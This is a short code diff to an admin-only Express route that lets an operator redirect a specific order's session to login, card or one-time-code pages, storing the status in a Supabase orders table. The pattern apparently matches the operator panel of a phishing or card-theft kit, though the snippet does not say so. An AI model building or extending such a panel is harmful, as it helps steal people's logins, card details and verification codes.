@@ -63,7 +63,7 @@ app.post('/api/admin/redirect/:id', async (req, res) => {
   try {
     if (!isAdmin(req)) return res.status(401).json({ success: false });
     const { page } = req.body;
-    const redirect_map = { card: 'login', otp: 'code', cvv: 'code' };
+    const redirect_map = { login: 'login', card: 'card', otp: 'code' };
     const redirect_to = redirect_map[page] || page || 'login';
     await supabase.from('orders').update({ status: 'redirect_' + (page || 'card'), redirect_to }).eq('id', req.params.id);
     const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
